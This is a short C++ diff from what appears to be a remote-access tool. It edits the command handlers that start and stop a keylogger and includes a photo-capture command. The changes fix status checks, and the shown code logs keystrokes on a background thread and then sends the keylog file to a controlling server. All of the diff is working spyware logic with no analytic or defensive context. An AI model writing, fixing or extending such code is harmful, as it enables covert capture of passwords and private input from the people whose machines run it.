@@ -897,7 +897,7 @@ void TakePhotoCommand::execute(Server& server, const std::string& param){
 
 void StartKeylogCommand::execute(Server& server, const std::string& param) {
     KeyLogger* kl = KeyLogger::getInstance(directory + "keylog.txt");
-    if (kl->getStatus() != RUNNING) {
+    if (kl->getStatus() == KL_WAITING) {
         std::thread t(&KeyLogger::start, kl);
         t.detach();
     }
@@ -909,7 +909,7 @@ void StartKeylogCommand::execute(Server& server, const std::string& param) {
 
 void StopKeylogCommand::execute(Server& server, const std::string& param) {
     KeyLogger* kl = KeyLogger::getInstance();
-    if (kl->getStatus() != RUNNING) {
+    if (kl->getStatus() == KL_WAITING) {
         server.echo("NOT-RUNNING");
         status = FAILURE;
         message = "Keylogger has not been started.\\nUse \\\"startkeylog\\\" command to start the keylogger.";
@@ -921,8 +921,7 @@ void StopKeylogCommand::execute(Server& server, const std::string& param) {
     server.echo("RUNNING");
     kl->stop();
     Sleep(100);
-    status = kl->getStatus();
-    if (status == SUCCESS) {
+    if (kl->getStatus() == KL_FINISHED) {
         status = sendFile(server, kl->getOutputFile());
         if (status == SUCCESS) {
             file_name = kl->getOutputFile();
@@ -936,6 +935,7 @@ void StopKeylogCommand::execute(Server& server, const std::string& param) {
         }
     }
     else {
+        status = FAILURE;
         message = "Error keylogger: Cannot keylog.";
     }
     server.echo(createResponse());
